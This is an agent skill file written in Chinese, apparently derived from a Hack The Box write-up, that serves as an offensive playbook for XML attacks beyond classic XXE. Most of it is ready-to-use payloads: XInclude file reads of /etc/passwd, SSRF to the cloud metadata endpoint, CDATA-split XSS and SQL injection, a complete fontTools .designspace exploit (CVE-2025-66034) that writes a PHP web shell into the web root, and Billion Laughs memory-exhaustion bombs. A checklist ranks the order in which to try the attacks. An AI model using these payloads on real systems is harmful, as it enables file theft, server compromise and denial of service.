---
name: 'xml-attacks-beyond-xxe'
description: 'XML 攻击超越经典 XXE：XInclude (无DOCTYPE读文件)、CDATA 分割注入、Parameter Entity 指数膨胀、fontTools .designspace CDATA RCE (CVE-2025-66034)。VariaType Hard 来源。'
disable-model-invocation: true
metadata: { domain: web, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# XML 处理攻击（超越经典 XXE）

> 经典 XXE 用 DOCTYPE 外部实体读文件。XML 处理攻击远不止这一种。
> 来源：VariaType HTB (Hard) + HackTricks + PortSwigger + OWASP

## 为什么需要这张表 — XXE 不是银弹

```
经典 XXE 前提: 能控制或注入 <!DOCTYPE>
现实:        很多应用已有 DOCTYPE，你只能注入 body 内的数据
            → XInclude 是解决方案 — 完全绕过 DOCTYPE
```

---

## 1. XInclude — 无需 DOCTYPE 的文件读取

> 🔴 **当 XXE 不通时的首选备选。** XInclude 是 W3C 标准，操作在 XML body 内，不需要动 DOCTYPE。

### 检测
```xml
<!-- 注入任意 SOAP/XML body 的数据字段 -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 文件读取
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### SSRF
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
</foo>
```

### PHP filter chain
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="php://filter/convert.base64-encode/resource=../index.php"/>
</foo>
```

### SOAP 信封内注入（ namespace 加到外层）
```xml
<soap:Envelope xmlns:xi="http://www.w3.org/2001/XInclude">
  <soap:Body>
    <getStock><productId>
      <xi:include parse="text" href="file:///etc/passwd"/>
    </productId></getStock>
  </soap:Body>
</soap:Envelope>
```

---

## 2. CDATA Injection — 绕过 XML 解析器向下游投毒

### 原理

```
XML 解析器:  <![CDATA[ 内容 ]] → 原样传递，不解析
应用代码:   取出 CDATA 内容 → 拼入另一个解释器 (HTML/SQL/PHP eval/Shell)
攻击者:     提前关闭 CDATA → 注入下游标记 → 重新打开 CDATA
```

### 通用分割模式

```xml
<element>
  <![CDATA[ benign ]]><malicious_injected><![CDATA[ more ]]> 
</element>
```

拆解: `CDATA[benign]]` → `>` 关闭 CDATA → `<malicious>` 裸标记 → `<![CDATA[more]]` 新 CDATA

### XSS via CDATA
```xml
<name><![CDATA[]]><script>alert(1)</script><![CDATA[]]></name>
```

### SQLi via CDATA
```xml
<user><name><![CDATA[admin']]><![CDATA[--]]></name></user>
```

### 🆕 fontTools .designspace CDATA → PHP RCE (CVE-2025-66034)

> VariaType HTB (Hard) 核心技术。CDATA 分割 + 路径穿越双重利用。

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en">
        <!-- CDATA 分割: 关闭→写 PHP→重开 -->
        <![CDATA[<?php system($_GET["c"]);?>]]]]><![CDATA[>]]>
      </labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
  </sources>
  <!-- 路径穿越: os.path.join() 对绝对路径无效 -->
  <variable-fonts>
    <variable-font name="evil" filename="/var/www/html/shell.php">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

```
攻击链:
  ① fontTools.varLib.main() 处理 .designspace
  ② <labelname> 内容 = 裸 PHP → 写入输出文件
  ③ filename="/var/www/html/shell.php" → os.path.join() 丢弃输出目录
  ④ → /var/www/html/shell.php 被创建 → GET → RCE

前置条件:
  - fonttools >= 4.33.0, < 4.60.2
  - Web 应用接受用户上传 .designspace + .ttf
  - 输出目录可被 Web 访问
```

### CDATA 分割语法解释

```xml
<![CDATA[<?php code ?>]]]]><![CDATA[>]]>
           ↑            ↑     ↑     ↑
         PHP代码     关闭CDATA  新CDATA  多余的>无害
```

---

## 3. XML Parameter Entity — 内部 DTD 内的高级攻击

> Parameter entity (`%name;`) 只能在 DTD 内使用，可以构造指数爆炸。

### Billion Laughs (通用实体 — 指数膨胀)

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<bomb>&lol9;</bomb>
<!-- 10^9 次 "lol" → 内存耗尽 -->
```

### Quadratic Blowup
```xml
<!DOCTYPE data [
<!ENTITY a "xxxx...10000个x...xxxx">
<!ENTITY b "&a;&a;&a;...100000次...&a;">
]>
<data>&b;</data>
```

---

## 攻击面识别清单

```
[ ] body 是 XML → 先试经典 XXE (DOCTYPE + SYSTEM)
[ ] 已有 DOCTYPE 但能注入 body → XInclude
[ ] 输出被 HTML/SQL/PHP 消费 → CDATA 分割注入
[ ] 上传 XML 文件 → 试所有三种 (DTD + XInclude + CDATA 分割)
[ ] .designspace 文件上传 → CVE-2025-66034 (CDATA 分割 + 路径穿越)
[ ] SOAP endpoint → 经典 XXE + XInclude (namespace 加到信封外层)
[ ] SVG 上传 → SVG XXE (DOCTYPE) + XInclude
[ ] Office 文档上传 (DOCX/XLSX) → OOXML XXE
```

## 与经典 XXE 的配合

```
优先级:
  ① 先试经典 XXE (DOCTYPE external entity) — 最快
  ② 不通 → XInclude — 绕过 DOCTYPE 限制
  ③ 输出回显 → CDATA 分割 — 向下游投毒
  ④ 上传文件 → 组合攻击 — XXE + CDATA + 路径穿越
```

**Why:** 经典 XXE skill 只覆盖了 DOCTYPE 外部实体。CDATA 分割和 XInclude 是 OA XXE 的基础补充，而且两者不需要 DOCTYPE 控制。
**How to apply:** 遇到 XML 端点 → DOCTYPE 不通就试 XInclude；输出被 HTML 消费就试 CDATA 分割。
